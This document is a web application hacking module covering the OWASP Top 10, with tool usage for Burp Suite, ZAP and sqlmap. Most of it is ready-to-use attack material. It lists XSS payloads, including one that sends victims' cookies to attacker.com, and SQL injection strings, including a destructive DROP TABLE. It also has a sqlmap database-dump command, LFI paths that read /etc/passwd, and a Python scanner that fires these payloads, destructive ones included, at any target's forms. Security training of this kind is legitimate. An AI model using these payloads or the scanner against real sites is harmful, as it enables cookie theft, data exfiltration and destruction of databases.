# Web Application Hacking - Topics Overview

## Topic Explanation
Web application hacking focuses on exploiting vulnerabilities in web applications including injection flaws, broken authentication, sensitive data exposure, XML external entities (XXE), broken access control, security misconfigurations, cross-site scripting (XSS), insecure deserialization, and using components with known vulnerabilities. This module covers the OWASP Top 10 vulnerabilities and advanced attack techniques targeting modern web applications.

## Articles for Further Reference
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

## Reference Links
- [OWASP Foundation](https://owasp.org/)
- [Burp Suite Academy](https://portswigger.net/web-security)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)

## Available Tools for the Topic

### Tool Name: Burp Suite
**Description:** Comprehensive web application security testing platform with proxy, scanner, intruder, and various other tools.

**Example Usage:**
```bash
# Start Burp Suite
burpsuite

# Configure browser proxy (127.0.0.1:8080)
# Intercept and modify requests
# Run automated scans
# Use Intruder for fuzzing
```

### Tool Name: OWASP ZAP
**Description:** Free web application security scanner with automated and manual testing capabilities.

**Example Usage:**
```bash
# Start ZAP
zap.sh

# Command line scanning
zap-cli start
zap-cli open-url http://target-app.com
zap-cli spider http://target-app.com
zap-cli active-scan http://target-app.com
```

### Tool Name: SQLMap
**Description:** Automatic SQL injection and database takeover tool.

**Example Usage:**
```bash
# Basic SQL injection test
sqlmap -u "http://target.com/page.php?id=1"

# Test POST parameters
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# Dump database
sqlmap -u "http://target.com/page.php?id=1" --dbs --dump
```

## All Possible Payloads for Manual Approach

### Cross-Site Scripting (XSS) Payloads
```html
<!-- Basic XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Advanced XSS -->
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
<iframe src="javascript:alert('XSS')"></iframe>
```

### SQL Injection Payloads
```sql
-- Basic SQL injection
' OR '1'='1
' OR 1=1--
' UNION SELECT null,null,null--

-- Advanced SQL injection
'; DROP TABLE users;--
' OR (SELECT COUNT(*) FROM users) > 0--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

### Local File Inclusion (LFI) Payloads
```bash
# Basic LFI
http://target.com/page.php?file=../../../../etc/passwd
http://target.com/page.php?file=..\..\..\..\windows\system32\drivers\etc\hosts

# PHP wrappers
http://target.com/page.php?file=php://filter/read=convert.base64-encode/resource=index.php
http://target.com/page.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
```

## Example Payloads

### Comprehensive Web Application Scanner
```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import urljoin, urlparse

class WebAppScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
        self.found_forms = []
    
    def crawl_application(self):
        """Basic crawling to find forms and endpoints"""
        response = self.session.get(self.target_url)
        
        # Find forms
        forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
        for form in forms:
            action = re.search(r'action=[\'"](.*?)[\'"]', form)
            method = re.search(r'method=[\'"](.*?)[\'"]', form)
            
            if action:
                form_url = urljoin(self.target_url, action.group(1))
                form_method = method.group(1) if method else 'GET'
                self.found_forms.append((form_url, form_method))
    
    def test_xss(self):
        """Test for Cross-Site Scripting vulnerabilities"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        for form_url, method in self.found_forms:
            for payload in xss_payloads:
                data = {'input': payload, 'search': payload, 'comment': payload}
                
                if method.upper() == 'POST':
                    response = self.session.post(form_url, data=data)
                else:
                    response = self.session.get(form_url, params=data)
                
                if payload in response.text:
                    self.vulnerabilities.append(f"XSS found at {form_url}")
    
    def test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        sqli_payloads = [
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE test;--"
        ]
        
        for form_url, method in self.found_forms:
            for payload in sqli_payloads:
                data = {'id': payload, 'username': payload, 'search': payload}
                
                try:
                    if method.upper() == 'POST':
                        response = self.session.post(form_url, data=data)
                    else:
                        response = self.session.get(form_url, params=data)
                    
                    # Check for SQL error messages
                    error_patterns = [
                        'mysql_fetch', 'ORA-01756', 'Microsoft OLE DB',
                        'SQLServer JDBC Driver', 'PostgreSQL query failed'
                    ]
                    
                    for pattern in error_patterns:
                        if pattern.lower() in response.text.lower():
                            self.vulnerabilities.append(f"SQL injection found at {form_url}")
                            break
                            
                except requests.RequestException:
                    pass
    
    def test_lfi(self):
        """Test for Local File Inclusion vulnerabilities"""
        lfi_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts"
        ]
        
        # Test common parameter names
        params = ['file', 'page', 'include', 'path', 'template']
        
        for param in params:
            for payload in lfi_payloads:
                test_url = f"{self.target_url}?{param}={payload}"
                response = self.session.get(test_url)
                
                # Check for file inclusion indicators
                if ('root:' in response.text or 
                    '[fonts]' in response.text or 
                    'bin/bash' in response.text):
                    self.vulnerabilities.append(f"LFI found: {test_url}")
    
    def generate_report(self):
        """Generate vulnerability report"""
        print("\n" + "="*50)
        print("WEB APPLICATION SECURITY SCAN REPORT")
        print("="*50)
        print(f"Target: {self.target_url}")
        print(f"Forms found: {len(self.found_forms)}")
        print(f"Vulnerabilities found: {len(self.vulnerabilities)}")
        
        if self.vulnerabilities:
            print("\nVulnerabilities:")
            for vuln in self.vulnerabilities:
                print(f"- {vuln}")
        else:
            print("\nNo vulnerabilities detected.")

# Usage
scanner = WebAppScanner("http://target-webapp.com")
scanner.crawl_application()
scanner.test_xss()
scanner.test_sql_injection()
scanner.test_lfi()
scanner.generate_report()
```